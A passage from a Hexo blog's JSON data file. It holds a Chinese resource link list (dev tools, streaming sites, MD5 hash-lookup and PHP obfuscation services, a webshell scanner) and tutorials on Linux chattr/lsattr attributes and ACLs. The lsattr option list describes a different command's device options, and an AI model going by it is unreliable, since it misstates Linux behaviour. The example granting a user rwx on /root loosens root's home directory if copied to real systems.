target=\"_blank\" rel=\"noopener\">https://youglish.com/</a> : 术语不会读？搜一下大家都怎么读吧</p>\n</li>\n<li><p><a href=\"https://nginxconfig.io/\" target=\"_blank\" rel=\"noopener\">https://nginxconfig.io/</a> : nginx配置生成</p>\n</li>\n<li><p><a href=\"https://tsaikoga.github.io/it-tools/index_cn.html\" target=\"_blank\" rel=\"noopener\">https://tsaikoga.github.io/it-tools/index_cn.html</a> : 方便开发的编程小工具</p>\n</li>\n<li><p><a href=\"https://www.toolfk.com\" target=\"_blank\" rel=\"noopener\">https://www.toolfk.com</a> : 优秀的网上工具箱</p>\n</li>\n<li><p><a href=\"https://www.staticfile.org/\" target=\"_blank\" rel=\"noopener\">https://www.staticfile.org/</a> : 七牛的静态开源库</p>\n</li>\n<li><p><a href=\"https://caniuse.com/#home\" target=\"_blank\" rel=\"noopener\">https://caniuse.com/#home</a> : 前端开发必备</p>\n</li>\n<li><p><a href=\"http://jsrun.net/\" target=\"_blank\" rel=\"noopener\">http://jsrun.net/</a> : 好用的代码在线编辑器</p>\n</li>\n</ul>\n<h3 id=\"开发手册\"><a href=\"#开发手册\" class=\"headerlink\" title=\"开发手册\"></a>开发手册</h3><ul>\n<li><p><a href=\"https://man.linuxde.net/\" target=\"_blank\" rel=\"noopener\">https://man.linuxde.net/</a> ：linux命令大全</p>\n</li>\n<li><p><a href=\"https://wangchujiang.com/linux-command\" target=\"_blank\" rel=\"noopener\">https://wangchujiang.com/linux-command</a> : linux命令搜索</p>\n</li>\n<li><p><a href=\"http://jquery.cuishifeng.cn/\" target=\"_blank\" rel=\"noopener\">http://jquery.cuishifeng.cn/</a> : jquery速查手册</p>\n</li>\n<li><p><a href=\"http://overapi.com/\" target=\"_blank\" rel=\"noopener\">http://overapi.com/</a> : 多语言聚合手册</p>\n</li>\n<li><p><a href=\"https://devhints.io/\" target=\"_blank\" rel=\"noopener\">https://devhints.io/</a> : 多语言聚合手册</p>\n</li>\n</ul>\n<h3 id=\"看剧摸鱼\"><a href=\"#看剧摸鱼\" class=\"headerlink\" title=\"看剧摸鱼\"></a>看剧摸鱼</h3><ul>\n<li><p><a href=\"https://anime1.me/\" target=\"_blank\" rel=\"noopener\">https://anime1.me/</a> : 动漫平台，需要翻墙</p>\n</li>\n<li><p><a href=\"https://91mjw.com/\" target=\"_blank\" rel=\"noopener\">https://91mjw.com/</a> : 91美剧网</p>\n</li>\n<li><p><a href=\"http://www.zzzfun.com/\" target=\"_blank\" rel=\"noopener\">http://www.zzzfun.com/</a> : 动漫网，速度和体验一般，资源还可以</p>\n</li>\n<li><p><a href=\"https://www.zxzjs.com/\" target=\"_blank\" rel=\"noopener\">https://www.zxzjs.com/</a> : 在线之家，界面简洁，解析速度快，美剧和电影比较丰富</p>\n</li>\n<li><p><a href=\"https://www.imeiju.io/\" target=\"_blank\" rel=\"noopener\">https://www.imeiju.io/</a> : 爱美剧，美剧资源很丰富</p>\n</li>\n<li><p><a href=\"https://www.dililitv.com/\" target=\"_blank\" rel=\"noopener\">https://www.dililitv.com/</a> : 嘀哩哩，电影资源丰富</p>\n</li>\n<li><p><a href=\"http://www.dilidili.name/\" target=\"_blank\" rel=\"noopener\">http://www.dilidili.name/</a> : D站，动漫资源还可以</p>\n</li>\n</ul>\n<h3 id=\"加解密\"><a href=\"#加解密\" class=\"headerlink\" title=\"加解密\"></a>加解密</h3><ul>\n<li><p><a href=\"https://www.somd5.com/\" target=\"_blank\" rel=\"noopener\">https://www.somd5.com/</a> : 免费的MD5解密平台</p>\n</li>\n<li><p><a href=\"http://www.ttmd5.com/\" target=\"_blank\" rel=\"noopener\">http://www.ttmd5.com/</a>  : 收费的MD5解密平台</p>\n</li>\n<li><p><a href=\"https://www.phpjiami.com/\" target=\"_blank\" rel=\"noopener\">https://www.phpjiami.com/</a> : PHP在线加密平台</p>\n</li>\n</ul>\n<h3 id=\"后门查杀\"><a href=\"#后门查杀\" class=\"headerlink\" title=\"后门查杀\"></a>后门查杀</h3><ul>\n<li><a href=\"http://www.shellpub.com/\" target=\"_blank\" rel=\"noopener\">http://www.shellpub.com/</a> : 河马webshell查杀</li>\n</ul>\n","site":{"data":{}},"excerpt":"","more":"<h3 id=\"编程开发\"><a href=\"#编程开发\" class=\"headerlink\" title=\"编程开发\"></a>编程开发</h3><ul>\n<li><p><a href=\"https://youglish.com/\" target=\"_blank\" rel=\"noopener\">https://youglish.com/</a> : 术语不会读？搜一下大家都怎么读吧</p>\n</li>\n<li><p><a href=\"https://nginxconfig.io/\" target=\"_blank\" rel=\"noopener\">https://nginxconfig.io/</a> : nginx配置生成</p>\n</li>\n<li><p><a href=\"https://tsaikoga.github.io/it-tools/index_cn.html\" target=\"_blank\" rel=\"noopener\">https://tsaikoga.github.io/it-tools/index_cn.html</a> : 方便开发的编程小工具</p>\n</li>\n<li><p><a href=\"https://www.toolfk.com\" target=\"_blank\" rel=\"noopener\">https://www.toolfk.com</a> : 优秀的网上工具箱</p>\n</li>\n<li><p><a href=\"https://www.staticfile.org/\" target=\"_blank\" rel=\"noopener\">https://www.staticfile.org/</a> : 七牛的静态开源库</p>\n</li>\n<li><p><a href=\"https://caniuse.com/#home\" target=\"_blank\" rel=\"noopener\">https://caniuse.com/#home</a> : 前端开发必备</p>\n</li>\n<li><p><a href=\"http://jsrun.net/\" target=\"_blank\" rel=\"noopener\">http://jsrun.net/</a> : 好用的代码在线编辑器</p>\n</li>\n</ul>\n<h3 id=\"开发手册\"><a href=\"#开发手册\" class=\"headerlink\" title=\"开发手册\"></a>开发手册</h3><ul>\n<li><p><a href=\"https://man.linuxde.net/\" target=\"_blank\" rel=\"noopener\">https://man.linuxde.net/</a> ：linux命令大全</p>\n</li>\n<li><p><a href=\"https://wangchujiang.com/linux-command\" target=\"_blank\" rel=\"noopener\">https://wangchujiang.com/linux-command</a> : linux命令搜索</p>\n</li>\n<li><p><a href=\"http://jquery.cuishifeng.cn/\" target=\"_blank\" rel=\"noopener\">http://jquery.cuishifeng.cn/</a> : jquery速查手册</p>\n</li>\n<li><p><a href=\"http://overapi.com/\" target=\"_blank\" rel=\"noopener\">http://overapi.com/</a> : 多语言聚合手册</p>\n</li>\n<li><p><a href=\"https://devhints.io/\" target=\"_blank\" rel=\"noopener\">https://devhints.io/</a> : 多语言聚合手册</p>\n</li>\n</ul>\n<h3 id=\"看剧摸鱼\"><a href=\"#看剧摸鱼\" class=\"headerlink\" title=\"看剧摸鱼\"></a>看剧摸鱼</h3><ul>\n<li><p><a href=\"https://anime1.me/\" target=\"_blank\" rel=\"noopener\">https://anime1.me/</a> : 动漫平台，需要翻墙</p>\n</li>\n<li><p><a href=\"https://91mjw.com/\" target=\"_blank\" rel=\"noopener\">https://91mjw.com/</a> : 91美剧网</p>\n</li>\n<li><p><a href=\"http://www.zzzfun.com/\" target=\"_blank\" rel=\"noopener\">http://www.zzzfun.com/</a> : 动漫网，速度和体验一般，资源还可以</p>\n</li>\n<li><p><a href=\"https://www.zxzjs.com/\" target=\"_blank\" rel=\"noopener\">https://www.zxzjs.com/</a> : 在线之家，界面简洁，解析速度快，美剧和电影比较丰富</p>\n</li>\n<li><p><a href=\"https://www.imeiju.io/\" target=\"_blank\" rel=\"noopener\">https://www.imeiju.io/</a> : 爱美剧，美剧资源很丰富</p>\n</li>\n<li><p><a href=\"https://www.dililitv.com/\" target=\"_blank\" rel=\"noopener\">https://www.dililitv.com/</a> : 嘀哩哩，电影资源丰富</p>\n</li>\n<li><p><a href=\"http://www.dilidili.name/\" target=\"_blank\" rel=\"noopener\">http://www.dilidili.name/</a> : D站，动漫资源还可以</p>\n</li>\n</ul>\n<h3 id=\"加解密\"><a href=\"#加解密\" class=\"headerlink\" title=\"加解密\"></a>加解密</h3><ul>\n<li><p><a href=\"https://www.somd5.com/\" target=\"_blank\" rel=\"noopener\">https://www.somd5.com/</a> : 免费的MD5解密平台</p>\n</li>\n<li><p><a href=\"http://www.ttmd5.com/\" target=\"_blank\" rel=\"noopener\">http://www.ttmd5.com/</a>  : 收费的MD5解密平台</p>\n</li>\n<li><p><a href=\"https://www.phpjiami.com/\" target=\"_blank\" rel=\"noopener\">https://www.phpjiami.com/</a> : PHP在线加密平台</p>\n</li>\n</ul>\n<h3 id=\"后门查杀\"><a href=\"#后门查杀\" class=\"headerlink\" title=\"后门查杀\"></a>后门查杀</h3><ul>\n<li><a href=\"http://www.shellpub.com/\" target=\"_blank\" rel=\"noopener\">http://www.shellpub.com/</a> : 河马webshell查杀</li>\n</ul>\n"},{"title":"resources","date":"2019-04-11T11:56:58.000Z","type":"resources","comments":0,"_content":"","source":"resources/index.md","raw":"---\ntitle: resources\ndate: 2019-04-11 19:56:58\ntype: \"resources\"\ncomments: false\n---\n","updated":"2019-04-11T11:59:20.026Z","path":"resources/index.html","layout":"page","_id":"ck9z76vtz000244vqj0zy9fd9","content":"","site":{"data":{}},"excerpt":"","more":""},{"title":"tags","date":"2019-04-10T07:13:14.000Z","type":"tags","comments":0,"_content":"","source":"tags/index.md","raw":"---\ntitle: tags\ndate: 2019-04-10 15:13:14\ntype: \"tags\"\ncomments: false\n---\n","updated":"2019-04-10T07:13:41.529Z","path":"tags/index.html","layout":"page","_id":"ck9z76vu0000344vqm6q4jkju","content":"","site":{"data":{}},"excerpt":"","more":""}],"Post":[{"layout":"post","title":"Linux文件的隐藏属性","abbrlink":1747,"_content":"\n### 前言\n\nLinux系统中的文件除了具备一般权限和特殊权限之外，还有一种隐藏权限，即被隐藏起来的权限，默认情况下不能直接被用户发觉。明明权限充足但却无法删除某个文件的情况，或者仅能在日志文件中追加内容而不能修改或删除内容，这在一定程度上阻止了黑客篡改系统日志的图谋，因此这种“奇怪”的文件也保障了Linux系统的安全性。\n\n<!--more-->\n\n### chattr 命令\n\nchattr命令用于设置文件的隐藏权限，格式为“chattr [参数] 文件”。如果想要把某个隐藏功能添加到文件上，则需要在命令后面追加“+参数”，如果想要把某个隐藏功能移出文件，则需要追加“-参数”\n\n共有以下8种模式：\n\n- a：让文件或目录仅供附加用途；\n- b：不更新文件或目录的最后存取时间；\n- c：将文件或目录压缩后存放；\n- d：将文件或目录排除在倾倒操作之外；\n- i：不得任意更动文件或目录；\n- s：保密性删除文件或目录；\n- S：即时更新文件或目录；\n- u：预防意外删除。\n\n\n选项：\n\n\n- -R：递归处理，将指令目录下的所有文件及子目录一并处理；\n- -v<版本编号>：设置文件或目录版本；\n- -V：显示指令执行过程；\n- +<属性>：开启文件或目录的该项属性；\n- -<属性>：关闭文件或目录的该项属性；\n- =<属性>：指定文件或目录的该项属性。\n\n\n新建一个普通文件，并为其设置不允许删除与覆盖（+a参数）权限，然后再尝试将这个文件删除：\n\n```\n[root@linuxprobe ~]# echo \"for Test\" > linuxprobe\n[root@linuxprobe ~]# chattr +a linuxprobe\n[root@linuxprobe ~]# rm linuxprobe\nrm: remove regular file ‘linuxprobe’? y\nrm: cannot remove ‘linuxprobe’: Operation not permitted\n```\n\n### lsattr 命令\n\nlsattr命令用于显示文件的隐藏权限，格式为“lsattr [参数] 文件”。\n\n- -E：可显示设备属性的当前值，但这个当前值是从用户设备数据库中获得的，而不是从设备直接获得的。\n- -D：显示属性的名称，属性的默认值，描述和用户是否可以修改属性值的标志。\n- -R：递归的操作方式；\n- -V：显示指令的版本信息；\n- -a：列出目录中的所有文件，包括隐藏文件。\n\n\nlsattr经常使用的几个选项-D，-E，-R这三个选项不可以一起使用，它们是互斥的，经常使用的还有-l,-H，使用lsattr时，必须指出具体的设备名，用-l选项指出要显示设备的逻辑名称，否则要用-c，-s，-t等选项唯一的确定某个已存在的设备。\n\n在Linux系统中，文件的隐藏权限必须使用lsattr命令来查看，平时使用的ls之类的命令则看不出端倪\n\n一旦使用lsattr命令后，文件上被赋予的隐藏权限马上就会原形毕露。此时可以按照显示的隐藏权限的类型（字母），使用chattr命令将其去掉：\n\n```\n[root@linuxprobe ~]# lsattr linuxprobe\n-----a---------- linuxprobe\n[root@linuxprobe ~]# chattr -a linuxprobe\n[root@linuxprobe ~]# lsattr linuxprobe \n---------------- linuxprobe\n[root@linuxprobe ~]# rm linuxprobe \nrm: remove regular file ‘linuxprobe’? y\n```\n\n\n\n","source":"_posts/2019/10/Linux文件的隐藏属性.md","raw":"---\nlayout: post\ntitle: Linux文件的隐藏属性\ntags:\n  - linux\ncategories:\n  - linux\nabbrlink: 1747\n---\n\n### 前言\n\nLinux系统中的文件除了具备一般权限和特殊权限之外，还有一种隐藏权限，即被隐藏起来的权限，默认情况下不能直接被用户发觉。明明权限充足但却无法删除某个文件的情况，或者仅能在日志文件中追加内容而不能修改或删除内容，这在一定程度上阻止了黑客篡改系统日志的图谋，因此这种“奇怪”的文件也保障了Linux系统的安全性。\n\n<!--more-->\n\n### chattr 命令\n\nchattr命令用于设置文件的隐藏权限，格式为“chattr [参数] 文件”。如果想要把某个隐藏功能添加到文件上，则需要在命令后面追加“+参数”，如果想要把某个隐藏功能移出文件，则需要追加“-参数”\n\n共有以下8种模式：\n\n- a：让文件或目录仅供附加用途；\n- b：不更新文件或目录的最后存取时间；\n- c：将文件或目录压缩后存放；\n- d：将文件或目录排除在倾倒操作之外；\n- i：不得任意更动文件或目录；\n- s：保密性删除文件或目录；\n- S：即时更新文件或目录；\n- u：预防意外删除。\n\n\n选项：\n\n\n- -R：递归处理，将指令目录下的所有文件及子目录一并处理；\n- -v<版本编号>：设置文件或目录版本；\n- -V：显示指令执行过程；\n- +<属性>：开启文件或目录的该项属性；\n- -<属性>：关闭文件或目录的该项属性；\n- =<属性>：指定文件或目录的该项属性。\n\n\n新建一个普通文件，并为其设置不允许删除与覆盖（+a参数）权限，然后再尝试将这个文件删除：\n\n```\n[root@linuxprobe ~]# echo \"for Test\" > linuxprobe\n[root@linuxprobe ~]# chattr +a linuxprobe\n[root@linuxprobe ~]# rm linuxprobe\nrm: remove regular file ‘linuxprobe’? y\nrm: cannot remove ‘linuxprobe’: Operation not permitted\n```\n\n### lsattr 命令\n\nlsattr命令用于显示文件的隐藏权限，格式为“lsattr [参数] 文件”。\n\n- -E：可显示设备属性的当前值，但这个当前值是从用户设备数据库中获得的，而不是从设备直接获得的。\n- -D：显示属性的名称，属性的默认值，描述和用户是否可以修改属性值的标志。\n- -R：递归的操作方式；\n- -V：显示指令的版本信息；\n- -a：列出目录中的所有文件，包括隐藏文件。\n\n\nlsattr经常使用的几个选项-D，-E，-R这三个选项不可以一起使用，它们是互斥的，经常使用的还有-l,-H，使用lsattr时，必须指出具体的设备名，用-l选项指出要显示设备的逻辑名称，否则要用-c，-s，-t等选项唯一的确定某个已存在的设备。\n\n在Linux系统中，文件的隐藏权限必须使用lsattr命令来查看，平时使用的ls之类的命令则看不出端倪\n\n一旦使用lsattr命令后，文件上被赋予的隐藏权限马上就会原形毕露。此时可以按照显示的隐藏权限的类型（字母），使用chattr命令将其去掉：\n\n```\n[root@linuxprobe ~]# lsattr linuxprobe\n-----a---------- linuxprobe\n[root@linuxprobe ~]# chattr -a linuxprobe\n[root@linuxprobe ~]# lsattr linuxprobe \n---------------- linuxprobe\n[root@linuxprobe ~]# rm linuxprobe \nrm: remove regular file ‘linuxprobe’? y\n```\n\n\n\n","slug":"2019/10/Linux文件的隐藏属性","published":1,"date":"2019-10-08T08:43:09.076Z","updated":"2020-04-12T06:34:43.615Z","comments":1,"photos":[],"link":"","_id":"ck9z76vz6000444vqo59t1l20","content":"<h3 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h3><p>Linux系统中的文件除了具备一般权限和特殊权限之外，还有一种隐藏权限，即被隐藏起来的权限，默认情况下不能直接被用户发觉。明明权限充足但却无法删除某个文件的情况，或者仅能在日志文件中追加内容而不能修改或删除内容，这在一定程度上阻止了黑客篡改系统日志的图谋，因此这种“奇怪”的文件也保障了Linux系统的安全性。</p>\n<a id=\"more\"></a>\n<h3 id=\"chattr-命令\"><a href=\"#chattr-命令\" class=\"headerlink\" title=\"chattr 命令\"></a>chattr 命令</h3><p>chattr命令用于设置文件的隐藏权限，格式为“chattr [参数] 文件”。如果想要把某个隐藏功能添加到文件上，则需要在命令后面追加“+参数”，如果想要把某个隐藏功能移出文件，则需要追加“-参数”</p>\n<p>共有以下8种模式：</p>\n<ul>\n<li>a：让文件或目录仅供附加用途；</li>\n<li>b：不更新文件或目录的最后存取时间；</li>\n<li>c：将文件或目录压缩后存放；</li>\n<li>d：将文件或目录排除在倾倒操作之外；</li>\n<li>i：不得任意更动文件或目录；</li>\n<li>s：保密性删除文件或目录；</li>\n<li>S：即时更新文件或目录；</li>\n<li>u：预防意外删除。</li>\n</ul>\n<p>选项：</p>\n<ul>\n<li>-R：递归处理，将指令目录下的所有文件及子目录一并处理；</li>\n<li>-v&lt;版本编号&gt;：设置文件或目录版本；</li>\n<li>-V：显示指令执行过程；</li>\n<li>+&lt;属性&gt;：开启文件或目录的该项属性；</li>\n<li>-&lt;属性&gt;：关闭文件或目录的该项属性；</li>\n<li>=&lt;属性&gt;：指定文件或目录的该项属性。</li>\n</ul>\n<p>新建一个普通文件，并为其设置不允许删除与覆盖（+a参数）权限，然后再尝试将这个文件删除：</p>\n<figure class=\"highlight autoit\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[root<span class=\"symbol\">@linuxprobe</span> ~]<span class=\"meta\"># echo <span class=\"string\">\"for Test\"</span> &gt; linuxprobe</span></span><br><span class=\"line\">[root<span class=\"symbol\">@linuxprobe</span> ~]<span class=\"meta\"># chattr +a linuxprobe</span></span><br><span class=\"line\">[root<span class=\"symbol\">@linuxprobe</span> ~]<span class=\"meta\"># rm linuxprobe</span></span><br><span class=\"line\">rm: remove regular file ‘linuxprobe’? y</span><br><span class=\"line\">rm: cannot remove ‘linuxprobe’: Operation <span class=\"literal\">not</span> permitted</span><br></pre></td></tr></table></figure>\n<h3 id=\"lsattr-命令\"><a href=\"#lsattr-命令\" class=\"headerlink\" title=\"lsattr 命令\"></a>lsattr 命令</h3><p>lsattr命令用于显示文件的隐藏权限，格式为“lsattr [参数] 文件”。</p>\n<ul>\n<li>-E：可显示设备属性的当前值，但这个当前值是从用户设备数据库中获得的，而不是从设备直接获得的。</li>\n<li>-D：显示属性的名称，属性的默认值，描述和用户是否可以修改属性值的标志。</li>\n<li>-R：递归的操作方式；</li>\n<li>-V：显示指令的版本信息；</li>\n<li>-a：列出目录中的所有文件，包括隐藏文件。</li>\n</ul>\n<p>lsattr经常使用的几个选项-D，-E，-R这三个选项不可以一起使用，它们是互斥的，经常使用的还有-l,-H，使用lsattr时，必须指出具体的设备名，用-l选项指出要显示设备的逻辑名称，否则要用-c，-s，-t等选项唯一的确定某个已存在的设备。</p>\n<p>在Linux系统中，文件的隐藏权限必须使用lsattr命令来查看，平时使用的ls之类的命令则看不出端倪</p>\n<p>一旦使用lsattr命令后，文件上被赋予的隐藏权限马上就会原形毕露。此时可以按照显示的隐藏权限的类型（字母），使用chattr命令将其去掉：</p>\n<figure class=\"highlight applescript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[root@linuxprobe ~]<span class=\"comment\"># lsattr linuxprobe</span></span><br><span class=\"line\"><span class=\"comment\">-----a---------- linuxprobe</span></span><br><span class=\"line\">[root@linuxprobe ~]<span class=\"comment\"># chattr -a linuxprobe</span></span><br><span class=\"line\">[root@linuxprobe ~]<span class=\"comment\"># lsattr linuxprobe </span></span><br><span class=\"line\"><span class=\"comment\">---------------- linuxprobe</span></span><br><span class=\"line\">[root@linuxprobe ~]<span class=\"comment\"># rm linuxprobe </span></span><br><span class=\"line\">rm: remove regular <span class=\"built_in\">file</span> ‘linuxprobe’? y</span><br></pre></td></tr></table></figure>\n","site":{"data":{}},"excerpt":"<h3 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h3><p>Linux系统中的文件除了具备一般权限和特殊权限之外，还有一种隐藏权限，即被隐藏起来的权限，默认情况下不能直接被用户发觉。明明权限充足但却无法删除某个文件的情况，或者仅能在日志文件中追加内容而不能修改或删除内容，这在一定程度上阻止了黑客篡改系统日志的图谋，因此这种“奇怪”的文件也保障了Linux系统的安全性。</p>","more":"<h3 id=\"chattr-命令\"><a href=\"#chattr-命令\" class=\"headerlink\" title=\"chattr 命令\"></a>chattr 命令</h3><p>chattr命令用于设置文件的隐藏权限，格式为“chattr [参数] 文件”。如果想要把某个隐藏功能添加到文件上，则需要在命令后面追加“+参数”，如果想要把某个隐藏功能移出文件，则需要追加“-参数”</p>\n<p>共有以下8种模式：</p>\n<ul>\n<li>a：让文件或目录仅供附加用途；</li>\n<li>b：不更新文件或目录的最后存取时间；</li>\n<li>c：将文件或目录压缩后存放；</li>\n<li>d：将文件或目录排除在倾倒操作之外；</li>\n<li>i：不得任意更动文件或目录；</li>\n<li>s：保密性删除文件或目录；</li>\n<li>S：即时更新文件或目录；</li>\n<li>u：预防意外删除。</li>\n</ul>\n<p>选项：</p>\n<ul>\n<li>-R：递归处理，将指令目录下的所有文件及子目录一并处理；</li>\n<li>-v&lt;版本编号&gt;：设置文件或目录版本；</li>\n<li>-V：显示指令执行过程；</li>\n<li>+&lt;属性&gt;：开启文件或目录的该项属性；</li>\n<li>-&lt;属性&gt;：关闭文件或目录的该项属性；</li>\n<li>=&lt;属性&gt;：指定文件或目录的该项属性。</li>\n</ul>\n<p>新建一个普通文件，并为其设置不允许删除与覆盖（+a参数）权限，然后再尝试将这个文件删除：</p>\n<figure class=\"highlight autoit\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[root<span class=\"symbol\">@linuxprobe</span> ~]<span class=\"meta\"># echo <span class=\"string\">\"for Test\"</span> &gt; linuxprobe</span></span><br><span class=\"line\">[root<span class=\"symbol\">@linuxprobe</span> ~]<span class=\"meta\"># chattr +a linuxprobe</span></span><br><span class=\"line\">[root<span class=\"symbol\">@linuxprobe</span> ~]<span class=\"meta\"># rm linuxprobe</span></span><br><span class=\"line\">rm: remove regular file ‘linuxprobe’? y</span><br><span class=\"line\">rm: cannot remove ‘linuxprobe’: Operation <span class=\"literal\">not</span> permitted</span><br></pre></td></tr></table></figure>\n<h3 id=\"lsattr-命令\"><a href=\"#lsattr-命令\" class=\"headerlink\" title=\"lsattr 命令\"></a>lsattr 命令</h3><p>lsattr命令用于显示文件的隐藏权限，格式为“lsattr [参数] 文件”。</p>\n<ul>\n<li>-E：可显示设备属性的当前值，但这个当前值是从用户设备数据库中获得的，而不是从设备直接获得的。</li>\n<li>-D：显示属性的名称，属性的默认值，描述和用户是否可以修改属性值的标志。</li>\n<li>-R：递归的操作方式；</li>\n<li>-V：显示指令的版本信息；</li>\n<li>-a：列出目录中的所有文件，包括隐藏文件。</li>\n</ul>\n<p>lsattr经常使用的几个选项-D，-E，-R这三个选项不可以一起使用，它们是互斥的，经常使用的还有-l,-H，使用lsattr时，必须指出具体的设备名，用-l选项指出要显示设备的逻辑名称，否则要用-c，-s，-t等选项唯一的确定某个已存在的设备。</p>\n<p>在Linux系统中，文件的隐藏权限必须使用lsattr命令来查看，平时使用的ls之类的命令则看不出端倪</p>\n<p>一旦使用lsattr命令后，文件上被赋予的隐藏权限马上就会原形毕露。此时可以按照显示的隐藏权限的类型（字母），使用chattr命令将其去掉：</p>\n<figure class=\"highlight applescript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[root@linuxprobe ~]<span class=\"comment\"># lsattr linuxprobe</span></span><br><span class=\"line\"><span class=\"comment\">-----a---------- linuxprobe</span></span><br><span class=\"line\">[root@linuxprobe ~]<span class=\"comment\"># chattr -a linuxprobe</span></span><br><span class=\"line\">[root@linuxprobe ~]<span class=\"comment\"># lsattr linuxprobe </span></span><br><span class=\"line\"><span class=\"comment\">---------------- linuxprobe</span></span><br><span class=\"line\">[root@linuxprobe ~]<span class=\"comment\"># rm linuxprobe </span></span><br><span class=\"line\">rm: remove regular <span class=\"built_in\">file</span> ‘linuxprobe’? y</span><br></pre></td></tr></table></figure>"},{"layout":"post","title":"Linux文件访问控制列表","abbrlink":36849,"_content":"\n### 前言\n\n如果希望对某个指定的用户进行单独的权限控制，就需要用到文件的访问控制列表（ACL）了。通俗来讲，基于普通文件或目录设置ACL其实就是针对指定的用户或用户组设置文件或目录的操作权限。另外，如果针对某个目录设置了ACL，则目录中的文件会继承其ACL；若针对文件设置了ACL，则文件不再继承其所在目录的ACL。\n\n<!--more-->\n\n### setfacl 命令\n\nsetfacl命令用于管理文件的ACL规则，格式为“setfacl [参数] 文件名称”。\n\n文件的ACL提供的是在所有者、所属组、其他人的读/写/执行权限之外的特殊权限控制，使用setfacl命令可以针对单一用户或用户组、单一文件或目录来进行读/写/执行权限的控制。\n\n其中，针对目录文件需要使用-R递归参数；针对普通文件则使用-m参数；如果想要删除某个文件的ACL，则可以使用-b参数。\n\n设置用户在/root目录上的权限：\n\n```\n[root@linuxprobe ~]# setfacl -Rm u:linuxprobe:rwx /root\n[root@linuxprobe ~]# su - linuxprobe\nLast login: Sat Mar 21 15:45:03 CST 2017 on pts/1\n[linuxprobe@linuxprobe ~]$ cd /root\n[linuxprobe@linuxprobe root]$ ls\nanaconda-ks.cfg Downloads Pictures Public\n[linuxprobe@linuxprobe root]$ cat anaconda-ks.cfg\n[linuxprobe@linuxprobe root]$ exit\n```\n\n常用的ls命令是看不到ACL表信息的，但是却可以看到文件的权限最后一个点（.）变成了加号（+）,这就意味着该文件已经设置了ACL了。\n\n\n```\n[root@linuxprobe ~]# ls -ld /root\ndr-xrwx---+ 14 root root 4096 May 4 2017 /root\n```\n\n\n### getfacl 命令\n\ngetfacl命令用于显示文件上设置的ACL信息，格式为“getfacl 文件名称”。\n\n想要设置ACL，用的是setfacl命令；要想查看ACL，则用的是getfacl命令。\n\n使用getfacl命令显示在root管理员家目录上设置的所有ACL信息。\n\n```\n[root@linuxprobe ~]# getfacl /root\ngetfacl: Removing leading '/' from absolute path names\n# file: root\n# owner: root\n# group: root\nuser::r-x\nuser:linuxprobe:rwx\ngroup::r-x\nmask::rwx\nother::---\n```\n\n","source":"_posts/2019/10/Linux文件访问控制列表.md","raw":"---\nlayout: post\ntitle: Linux文件访问控制列表\ntags:\n  - linux\ncategories:\n  - linux\nabbrlink: 36849\n---\n\n### 前言\n\n如果希望对某个指定的用户进行单独的权限控制，就需要用到文件的访问控制列表（ACL）了。通俗来讲，基于普通文件或目录设置ACL其实就是针对指定的用户或用户组设置文件或目录的操作权限。另外，如果针对某个目录设置了ACL，则目录中的文件会继承其ACL；若针对文件设置了ACL，则文件不再继承其所在目录的ACL。\n\n<!--more-->\n\n### setfacl 命令\n\nsetfacl命令用于管理文件的ACL规则，格式为“setfacl [参数] 文件名称”。\n\n文件的ACL提供的是在所有者、所属组、其他人的读/写/执行权限之外的特殊权限控制，使用setfacl命令可以针对单一用户或用户组、单一文件或目录来进行读/写/执行权限的控制。\n\n其中，针对目录文件需要使用-R递归参数；针对普通文件则使用-m参数；如果想要删除某个文件的ACL，则可以使用-b参数。\n\n设置用户在/root目录上的权限：\n\n```\n[root@linuxprobe ~]# setfacl -Rm u:linuxprobe:rwx /root\n[root@linuxprobe ~]# su - linuxprobe\nLast login: Sat Mar 21 15:45:03 CST 2017 on pts/1\n[linuxprobe@linuxprobe ~]$ cd /root\n[linuxprobe@linuxprobe root]$ ls\nanaconda-ks.cfg Downloads Pictures Public\n[linuxprobe@linuxprobe root]$ cat anaconda-ks.cfg\n[linuxprobe@linuxprobe root]$ exit\n```\n\n常用的ls命令是看不到ACL表信息的，但是却可以看到文件的权限最后一个点（.）变成了加号（+）,这就意味着该文件已经设置了ACL了。\n\n\n```\n[root@linuxprobe ~]# ls -ld /root\ndr-xrwx---+ 14 root root 4096 May 4 2017 /root\n```\n\n\n### getfacl 命令\n\ngetfacl命令用于显示文件上设置的ACL信息，格式为“getfacl 文件名称”。\n\n想要设置ACL，用的是setfacl命令；要想查看ACL，则用的是getfacl命令。\n\n使用getfacl命令显示在root管理员家目录上设置的所有ACL信息。\n\n```\n[root@linuxprobe ~]# getfacl /root\ngetfacl: Removing leading '/' from absolute path names\n# file: root\n# owner: root\n# group: root\nuser::r-x\nuser:linuxprobe:rwx\ngroup::r-x\nmask::rwx\nother::---\n```\n\n","slug":"2019/10/Linux文件访问控制列表","published":1,"date":"2019-10-08T09:07:43.371Z","updated":"2020-04-12T06:34:43.616Z","comments":1,"photos":[],"link":"","_id":"ck9z76vz8000544vqwlsj0mkl","content":"<h3 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h3><p>如果希望对某个指定的用户进行单独的权限控制，就需要用到文件的访问控制列表（ACL）了。通俗来讲，基于普通文件或目录设置ACL其实就是针对指定的用户或用户组设置文件或目录的操作权限。另外，如果针对某个目录设置了ACL，则目录中的文件会继承其ACL；若针对文件设置了ACL，则文件不再继承其所在目录的ACL。</p>\n<a id=\"more\"></a>\n<h3 id=\"setfacl-命令\"><a 